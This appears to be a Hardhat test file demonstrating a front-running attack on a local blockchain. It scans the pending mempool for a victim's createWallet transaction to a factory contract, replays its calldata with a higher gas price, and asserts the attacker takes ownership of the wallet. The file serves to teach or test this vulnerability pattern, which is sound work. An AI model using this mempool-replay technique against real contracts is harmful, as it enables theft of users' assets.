import { assert } from "chai";
import { ethers } from "hardhat";
import { Wallet, FactoryWithAttack } from "../typechain-types"
import { BigNumber, Signer } from "ethers";

describe("Front running Attack ", function () {
  let owner: Signer, alice: Signer, attacker: Signer, factory: FactoryWithAttack

  before(async () => {
    [owner, alice, attacker] = await ethers.getSigners();
    const Factory = await ethers.getContractFactory('FactoryWithAttack');
    factory = await Factory.connect(owner).deploy();

  })
  it("Perform the Front Running Attack", async function () {
    // create random salt  
    const salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("SomeRandomSalt"));
    // here we made call for create wallet
    await factory.connect(alice).createWallet(salt);

    // get all pending transaction from mempool
    const tsx = await ethers.provider.send('eth_getBlockByNumber', [
      'pending',
      true
    ]);


    // Now it time to find transaction which we are intrested
    // we are looking for any transaction from factory
    const tx = tsx.transactions.find((tx: any) => tx.to === factory.address.toLowerCase())

    // Once we found  we will resend some transaction to get profile from it
    await attacker.sendTransaction({
      to: tx.to,
      data: tx.input,
      gasLimit: ethers.BigNumber.from(30000000),
      gasPrice: ethers.BigNumber.from(tx.gasPrice).add(100),
    })
    // We are using hardhat network so we control of minting on transction on network
    // Mint All transaction
    await ethers.provider.send("evm_mine", [])

    // get wallet contract address with attacker address
    const addressWallet = await factory.walletOwner(attacker.getAddress());
    console.log("wallet.owner()", addressWallet);

    // get wallet contract
    const wallet: Wallet = await ethers.getContractAt("Wallet", addressWallet, attacker);
    await ethers.provider.send("evm_mine", []);
    console.log("wallet.owner()", await wallet.owner());

    assert.equal(await factory.walletOwner(await alice.getAddress()), ethers.constants.AddressZero);
    assert.equal(await wallet.owner(), await attacker.getAddress());
    assert.equal(await wallet.initialized(), true);
  })
})